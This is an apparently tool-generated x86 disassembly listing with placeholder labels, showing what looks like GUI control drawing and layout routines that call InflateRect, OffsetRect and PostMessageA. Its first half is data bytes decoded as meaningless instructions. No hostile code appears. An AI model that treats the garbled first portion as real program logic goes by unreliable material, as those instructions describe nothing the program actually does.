add [ eax ] ah
pop ds
inc esp
add [ eax ] al
add [ eax ] al
add [ 0xf800000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
inc ebx
add [ ecx ] ah
add bh bh
mov eax 0x54004410
adc [ eax + eax ] eax
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax - 0x3a ] ch
inc ebx
add [ ebx ] bl
add bh bh
js r-xdata
add [ ecx + edi ] bl
inc ebx
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
inc esp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x28 ] 0x10
inc ebx
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ ecx + edx ] dh
inc ebx
add [ esi + edx * 2 + 0x550c0044 ] ah
inc esp
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax + ebx * 2 - 0x7b67ffbc ] bh
inc esp
add [ eax - 0x7eabffbc ] al
inc esp
add [ esp + eax * 4 ] al
inc esp
add [ ecx + edx + 0x43 ] al
add ah bh
add [ ebx ] 0x5
add [ eax + esi * 4 ] cl
push cs
mov al 0x5
add ch bh
push [ esi + 0x438394ff ]
add ah dl
add [ ebx ] 0xffffffe8
add [ ebx ] 0x0
test [ ebx ] al
jo r-xdata
inc esp
add [ edi + ebx * 2 ] dh
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x5f340044
add [ eax - 0x33ffbb76 ] dh
inc eax
add [ eax + 0x58004460 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add [ edi + edi * 2 ] ah
mov al 0xd1
inc ebx
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080040 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x73 ] bp
inc eax
add ah bl
pushad
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ah 0xff
adc [ eax ] al
sbb al 0x2
add bh bh
clc
add [ ebx ] 0x1
add [ eax ] al
add [ eax + 0x1 ] al
adc [ eax ] al
pop es
inc ebx
outsd
insb
jne r-xdata
add [ eax ] al
js r-xdata
insb
imul esp [ edi + 0x6e ] r-xdata
popad
add [ eax ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
adc al 0xcd
add [ edx + ebp * 2 - 0x7e7fffbf ] al
inc ebx
add [ edx + edx ] dh
inc esp
add [ ecx + eax * 4 + 0x1b4c0043 ] dl
inc esp
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
outsd
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
fsub [ eax + 0x43 ]
add ah cl
les eax [ edx ]
or eax [ eax ]
or [ ebp + 0x78 ] al
je r-xdata
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
outsb
jae r-xdata
popad
jo r-xdata
add [ eax - 0x80000000 ] al
push cs
add [ edi ] al
inc ebx
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
je r-xdata
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
inc esp
test [ eax + eax - 0x18 ] eax
test [ eax + eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
je r-xdata
add dh bh
mov [ esi ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xa465646f
int3
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ esi + edi * 2 - 0x754fffbd ] dl
inc esp
add ah cl
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x5f340044
inc esp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x28 ] 0x10
inc ebx
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ ecx + edx ] dh
inc ebx
add [ esi + edx * 2 + 0x550c0044 ] ah
inc esp
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax + ebx * 2 - 0x7b67ffbc ] bh
inc esp
add [ eax - 0x7eabffbc ] al
inc esp
add [ esp + eax * 4 ] al
inc esp
add [ ecx + edx + 0x43 ] al
add ah bh
add [ ebx ] 0xb
push esp
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ ebx + 0x43 ] ah
add [ edi ] al
or edx [ edx + edx * 2 + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
push esp
bound eax [ ebx ]
fsub [ ecx + 0x43 ]
add [ esi ] ch
add [ eax ] cl
inc ebp
js r-xdata
insb
jae r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
xor eax [ eax + edx * 2 - 0x3a ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
add [ edx + 0x43 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
arpl [ ebx ] ax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ebx + 0x43 ] ah
add [ eax ] ch
add al [ eax ]
add [ eax + 0x14004360 ] dl
jmp 0x3957627b
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
[ eax + 0x1e ]
jae r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0019 ] al
outsd
outsb
jae r-xdata
adc [ eax ] al
sbb [ edx ] al
add bh bh
xor [ edx + 0x10043 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
pop ss
add [ ecx ] cl
dec ecx
je r-xdata
inc esp
add [ eax + 0x1e ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
add bh bh
pop eax
push ds
jb r-xdata
outsb
je r-xdata
jb r-xdata
add [ esi ] cl
insd
dec ecx
outsb
js r-xdata
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
in al 0xfc
inc ecx
add [ eax ] ch
int3
push cs
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
push eax
popad
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500a00
outsb
je r-xdata
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
add [ eax ] al
add [ eax + eax ] dl
aas
inc ecx
add [ edx + eax ] dl
add bh bh
lodsb [ esi ]
add [ ebx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050018 ] al
je r-xdata
outsb
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
nop
push ds
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ ecx ] cl
push eax
add [ eax - 0x80000000 ] al
and [ eax ] al
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
add [ eax + eax ] bl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
[ eax ]
add [ eax ] eax
add [ eax ] al
sbb eax [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
insd
jae r-xdata
xchg [ eax + eax - 0x60 ] al
xchg [ eax + eax + 0x1 ] al
push 0x6948776f
outsb
je r-xdata
test [ esp + eax * 2 ] bl
add ah bh
cmp eax 0x44
add [ eax + 0x1 ] al
and eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x54656c62
xor al 0x41
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
jo r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
imul ebp [ esi + 0x74 ] r-xdata
and [ esi - 0x795fffbc ] al
inc esp
add [ ecx ] al
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
push eax
popad
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ esi ] cl
outsb
je r-xdata
int 0x43
add [ eax + eax ] dh
call [ edx + eax * 2 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
je r-xdata
outsb
push cs
inc ebp
add [ eax + eax ] bh
[ ebx + 0x10044 ]
add [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
outsb
jne r-xdata
adc [ eax ] al
0xd8ff0000 0x441e
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push [ esi + ebx + 0x1e7c0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080020 ] al
push 0x6948776f
outsb
je r-xdata
sbb al 0x0
adc [ eax ] al
test eax 0xf4ff0001
test [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
int3
sub_436830
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_421a00
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_422188
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_421a00
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_422188
pop ebx
mov esp ebp
pop ebp
retn
sub_4368f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_421b0c
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_436830
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_436954
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4495c8
mov eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42455c
mov esi eax
mov [ ebx + 0x168 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_436d98
mov [ esi + 0x24 ] ebx
mov eax ebx
mov dx 0xffc7
call sub_4038d4
mov [ esi + 0x20 ] eax
mov edx 0x69
mov eax ebx
call sub_441544
mov edx 0x69
mov eax ebx
call sub_441520
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_4369ec
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x168 ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_449624
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_436a38
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x168 ]
call sub_424c7c
mov esi eax
mov eax [ ebx + 0x168 ]
call sub_424c94
mov edi eax
mov eax ebx
call sub_441768
mov [ esp ] eax
mov eax ebx
call sub_4417ac
mov [ esp + 0x4 ] eax
cmp [ ebx + 0x178 ] 0x0
jne r-xdata
cmp [ ebx + 0x17d ] 0x0
je r-xdata
cmp [ ebx + 0x17d ] 0x0
je r-xdata
mov esi [ esp ]
mov edi [ esp + 0x4 ]
test esi esi
jle r-xdata
xor eax eax
mov [ ebp ] eax
xor eax eax
mov [ ebp + 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov [ ebp + 0xc ] edi
cmp [ ebx + 0x179 ] 0x0
je r-xdata
cmp esi [ esp ]
jg r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
sub eax edi
sar eax 0x1
jns r-xdata
test edi edi
jle r-xdata
cmp edi [ esp + 0x4 ]
jle r-xdata
push eax
mov eax [ esp + 0x4 ]
sub eax esi
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ esp + 0x10 ] esi
fild [ esp + 0x10 ]
mov [ esp + 0x14 ] edi
fild [ esp + 0x14 ]
fdivp st1
fstp [ esp + 0x8 ]
fwait
cmp edi esi
jge r-xdata
push eax
push ebp
call OffsetRect
adc eax 0x0
mov edi [ esp + 0x4 ]
fild [ esp + 0x4 ]
fmul [ esp + 0x8 ]
call sub_402ac4
mov esi eax
cmp esi [ esp ]
jle r-xdata
mov esi [ esp ]
fild [ esp ]
fdiv [ esp + 0x8 ]
call sub_402ac4
mov edi eax
cmp edi [ esp + 0x4 ]
jle r-xdata
mov esi [ esp ]
fild [ esp ]
fdiv [ esp + 0x8 ]
call sub_402ac4
mov edi eax
jmp r-xdata
mov edi [ esp + 0x4 ]
fild [ esp + 0x4 ]
fmul [ esp + 0x8 ]
call sub_402ac4
mov esi eax
jmp r-xdata
sub_436b64
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x17c ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x17c ] 0x1
xor eax eax
push ebp
push sub_436c15
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_436a38
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x168 ]
mov ecx [ eax + 0xc ]
mov eax ebx
call sub_422210
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436c1c
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x17c ] dl
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
mov eax [ ebx + 0x10 ]
mov dl 0x1
call sub_421adc
mov eax [ ebx + 0x14 ]
mov dl 0x1
call sub_421dfc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4221c0
sub_436c24
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov eax [ ebp + 0x168 ]
mov esi [ eax + 0xc ]
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x1
jne r-xdata
test esi esi
je r-xdata
cmp [ esi + 0x22 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax ebp
call sub_4592cc
mov edi eax
test edi edi
je r-xdata
mov [ esi + 0x22 ] 0x0
jmp r-xdata
cmp [ edi + 0x22e ] 0x0
je r-xdata
mov eax edi
call sub_448788
test al al
je r-xdata
cmp [ ebp + 0x17c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x30f
mov eax edi
call sub_448484
push eax
call PostMessageA
push 0x0
xor ecx ecx
mov edx 0x30f
mov eax edi
call sub_442f30
jmp r-xdata
mov bl 0x1
mov [ esi + 0x22 ] 0x0
sub_436cbc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
mov ebx [ ebp + 0x10 ]
test [ esi + 0x17a ] bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov eax esi
call sub_436c24
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
mov al [ ebp + 0x14 ]
push eax
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx edi
mov eax [ esi + 0x174 ]
call [ esi + 0x170 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
jmp r-xdata
sub_436d98
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x168 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebx + 0x168 ]
call sub_424c7c
test eax eax
jle r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
jne r-xdata
mov eax [ ebx + 0x168 ]
call sub_424c94
test eax eax
jle r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
jne r-xdata
mov eax [ ebx + 0x168 ]
call sub_424c7c
push eax
mov eax [ ebx + 0x168 ]
call sub_424c94
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov dl [ ebx + 0x17b ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
cmp [ ebx + 0x17c ] 0x0
je r-xdata
cmp [ ebx + 0x17d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
jmp r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_436c24
test al al
je r-xdata
sub_436ea4
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
test [ esi + 0x1c ] 0x10
je r-xdata
mov al [ esi + 0x5b ]
test al al
je r-xdata
mov eax [ esi + 0x168 ]
call sub_424c7c
test eax eax
jle r-xdata
mov eax [ esi + 0x168 ]
call sub_424c7c
mov [ edi ] eax
add al 0xfd
sub al 0x2
jae r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x168 ]
call sub_424c94
test eax eax
jle r-xdata
mov eax [ esi + 0x168 ]
call sub_424c94
mov [ ebp ] eax
mov al [ esi + 0x5b ]
sub al 0x3
jae r-xdata
sub_436f0c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4495c8
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x168 ] 0x0
mov [ esi + 0x169 ] 0x0
mov edx 0x32
mov eax esi
call sub_441520
mov edx 0x32
mov eax esi
call sub_441544
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_436fb0
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x160 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ esi + 0x10 ]
call sub_421a00
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_414b3c
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_414b3c
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_414b3c
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x2
mov eax esi
call sub_422188
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ esi + 0x10 ]
call sub_421a00
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_414b3c
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_414b3c
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_414b3c
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x2
mov eax esi
call sub_422188
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4370a0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov edx [ ebp + 0x10 ]
mov edx [ edx - 0x4 ]
mov ebx [ edx + 0x160 ]
mov edx eax
mov eax [ ebx + 0x10 ]
call sub_421a00
mov ecx edi
mov edx esi
mov eax ebx
call sub_42215c
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4220fc
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4370e0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx 0x1
mov eax [ ebx + 0x10 ]
call sub_421b0c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x169 ] 0x6
jne r-xdata
mov [ ebp - 0x8 ] 0x80000014
mov [ ebp - 0xc ] 0x80000010
mov [ ebp - 0x8 ] 0x80000010
mov [ ebp - 0xc ] 0x80000014
jmp r-xdata
xor edx edx
mov eax [ ebx + 0x10 ]
call sub_421adc
mov dl 0x4
mov eax [ ebx + 0x10 ]
call sub_421ac0
xor edx edx
mov eax [ ebx + 0x10 ]
call sub_421a00
xor edx edx
mov eax [ ebx + 0x14 ]
call sub_421dfc
mov dl 0x2
mov eax [ ebx + 0x10 ]
call sub_421adc
mov dl 0xe
mov eax [ ebx + 0x10 ]
call sub_421ac0
mov edx 0xffd8ce
mov eax [ ebx + 0x10 ]
call sub_421a00
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_421dfc
mov eax [ ebp - 0x4 ]
call sub_441768
push eax
mov eax [ ebp - 0x4 ]
call sub_4417ac
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4221c0
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_4371d2 ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x169 ]
cmp eax 0x5
ja r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
dec ecx
xor edx edx
xor eax eax
call sub_414b64
lea eax [ ebp - 0x1c ]
call sub_436fb0
pop ecx
jmp r-xdata
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
dec ecx
mov edx 0x1
mov eax 0x1
call sub_414b64
lea eax [ ebp - 0x1c ]
call sub_436fb0
pop ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x2
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
sub ecx 0x2
xor edx edx
xor eax eax
call sub_414b64
lea eax [ ebp - 0x1c ]
call sub_436fb0
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4370a0
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
